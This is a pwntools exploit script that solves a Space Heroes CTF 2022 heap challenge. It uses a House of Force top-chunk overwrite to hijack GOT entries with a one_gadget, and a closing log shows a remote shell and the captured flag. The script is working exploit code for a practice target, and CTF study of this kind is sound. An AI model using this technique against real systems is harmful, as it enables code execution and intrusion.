from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './force'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "0.cloud.chals.io"
  PORT = 11996
  s = remote(HOST, PORT)
else:
  s = process(BINARY)
  #s = process(BINARY, env={'LD_PRELOAD': './libc-2.23.so'})
libc = elf.libc

def Reach_out(size, data):
  s.sendlineafter("(2) Surrender\n", "1")
  s.sendlineafter("midi-chlorians?: ", str(size))
  if size > 0:
    s.sendafter("What do you feel?: ", data)

s.recvuntil("system at 0x")
system_addr = int(s.recvuntil("\n"), 16)
libc_base   = system_addr - libc.sym.system
one_gadget  = libc_base + 0x419f6

print "system_addr =", hex(system_addr)
print "libc_base   =", hex(libc_base)

s.recvuntil("something else at 0x")
heap_addr = int(s.recvuntil("\n"), 16)
print "heap_addr   =", hex(heap_addr)

Reach_out(0x18, "A"*0x10+p64(0)+p64(0xffffffffffffffff))

target_addr = 0x601010
top_chunk_addr = heap_addr + 0x20

Reach_out(target_addr - top_chunk_addr, "B")

Reach_out(0x40, p64(0x400766)+p64(0x400776)+p64(0x400786)+p64(0x400796)+p64(one_gadget))

Reach_out(0, "C")

s.interactive()

'''
mito@ubuntu:~/CTF/Space_Heroes_CTF_2022/Pwn_Use_the_Force,_Luke/force$ python solve.py r
[*] '/home/mito/CTF/Space_Heroes_CTF_2022/Pwn_Use_the_Force,_Luke/force/force'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  './.glibc/glibc_2.28_no-tcache'
[+] Opening connection to 0.cloud.chals.io on port 11996: Done
[*] '/home/mito/CTF/Space_Heroes_CTF_2022/Pwn_Use_the_Force,_Luke/force/.glibc/glibc_2.28_no-tcache/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
system_addr = 0x7f9d0515bb70
libc_base   = 0x7f9d0511a000
heap_addr   = 0x2112000
[*] Switching to interactive mode
What do you feel?: $ id
uid=1000(luke) gid=1000(luke) groups=1000(luke)
$ ls -l
total 16
-rw-r--r-- 1 root root   37 Mar 24 23:16 flag.txt
-rwxrwxr-x 1 root root 8880 Feb 10 16:41 force
$ cat flag.txt
shctf{st4r_w4rs_1s_pr3tty_0v3rr4t3d}
'''
